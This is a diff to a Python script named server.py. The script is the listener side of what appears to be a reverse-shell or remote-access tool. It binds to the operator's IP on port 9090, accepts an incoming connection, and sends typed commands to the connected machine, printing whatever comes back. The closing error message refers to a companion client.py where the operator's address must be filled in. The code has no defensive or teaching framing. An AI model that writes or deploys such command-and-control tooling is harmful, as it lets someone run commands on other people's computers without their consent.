@@ -25,26 +25,30 @@ try:
 	s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 
 
-	HOST = "YOU'RE IP ADDRESS"
-	PORT = 9090
+	HOST = "YOU'RE IP ADDRESS" # Change This
+	PORT = 9090 
 
-
+	s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 	s.bind((HOST, PORT))
-
+	print("[*] Listening for Conections...\n")
 	s.listen()
-	print("[*] Listening for connections...")
+	conn, addr = s.accept()
 
-	client, addr = s.accept()
-	print(f"[+] Connected to {addr[0]} at {addr[1]}")
-	print("")
+	print(f"[+] Connected to {addr}")
 
 	while True:
-		command = input(">> ")
-		client.send(command.encode("utf-8"))
-		if command == "quit":
-			client.close()
-			break	
-		print("")
-		print(client.recv(1024).decode("utf-8"))
+	    command = input(">>> ")
+	    if command != "":
+	        if command != "quit":
+	            conn.send(command.encode())
+	            recieved_data = conn.recv(5000).decode()
+	            print(recieved_data)
+	        else:
+	            conn.close()
+	            print("\n[-] Connection Closed!\n")
+	            break
+	    else:
+	        pass
+
 except socket.gaierror:
 	print("[-] ERROR: Change value of HOST to you're IP Address in server.py and change in file client.py\nin line 86, where placeholder [YOU'RE IP ADDRESS] to you're IP address")
